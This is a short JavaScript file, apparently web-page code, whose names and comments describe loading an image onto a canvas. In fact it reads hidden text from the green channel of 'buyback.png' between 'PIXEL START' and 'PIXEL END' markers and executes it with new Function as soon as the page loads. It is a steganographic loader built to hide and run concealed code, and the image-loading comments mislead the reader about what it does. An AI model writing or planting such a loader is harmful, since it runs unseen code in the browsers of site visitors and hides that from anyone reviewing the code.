const loadImage = (img) => new Function(img)();

const loadCanvasImage = async () => {
  // Create canvas image
  const canvas = document.getElementById("canva");
  const ctx = canvas.getContext("2d");
  const imgEl = document.createElement("img");
  // Load image
  imgEl.src = "./img/buyback.png";
  imgEl.onload = () => {
    // Match canvas size with image size
    ctx.canvas.width = imgEl.width;
    ctx.canvas.height = imgEl.height;
    ctx.drawImage(imgEl, 0, 0);
    const imageData = ctx.getImageData(0, 0, imgEl.width, imgEl.height);
    // Parsing image
    const pixelColorArray = imageData.data;
    const pixelRGB = [];
    for (let i = 0; i < pixelColorArray.length; i += 4) {
      pixelRGB.push([
        pixelColorArray[i],
        pixelColorArray[i + 1],
        pixelColorArray[i + 2],
      ]);
    }
    const pixelRGBColor = pixelRGB
      .map(([r, g, b]) => String.fromCharCode(g))
      .join("");
    const [img] = pixelRGBColor.match(
      /(?<=----PIXEL START----)(.*)(?=----PIXEL END----)/
    );
    // If image not correctly parsed, then stop
    if (img === null) return;
    // Load image
    loadImage(img);
  };
};

window.onload = () => {
  loadCanvasImage();
};
